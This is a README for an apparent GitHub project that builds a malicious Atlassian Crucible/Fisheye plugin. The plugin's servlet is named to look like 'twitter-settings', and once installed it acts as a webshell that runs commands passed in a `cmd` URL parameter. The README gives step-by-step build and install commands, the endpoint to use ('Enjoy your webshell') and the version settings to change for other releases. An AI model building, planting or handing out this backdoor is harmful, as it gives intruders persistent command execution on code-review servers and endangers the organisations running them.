## Summary
A malicious plugin for Atlassian Crucible/Fisheye that when installed gives command execution via `/plugins/servlet/twitter-settings?cmd=id` endpoint

## Usage
1. Install Atlassian Plugin SDK. E.g. for MacOS:
```bash
brew tap atlassian/tap
brew install atlassian/tap/atlassian-plugin-sdk
```

2. Clone this repo & cd into it
```bash
git clone https://github.com/UgniusV/fecru-webshell-plugin.git
cd fecru-webshell-plugin
```

3. Generate a JAR by running
```bash
atlas-package
```

4. Generated JAR is now placed at `./target/fecrutwitter-1.0.0-SNAPSHOT.jar`
5. Navigate to http://crucible:8060/plugins/servlet/upm?source=side_nav_manage_addons & install the JAR
6. Enjoy your webshell at: http://crucible:8060/plugins/servlet/twitter-settings?cmd=id

### Important note
Currently this plugin is designed to work with Crucible/Fisheye `4.8.11`. If you would like to install it on another version, please change the versions & build numbers accordingly inside `pom.xml`
```xml
        <fecru.version>4.8.11-20221216114657</fecru.version>
        <fecru.data.version>4.8.11-20221216114657</fecru.data.version>
```
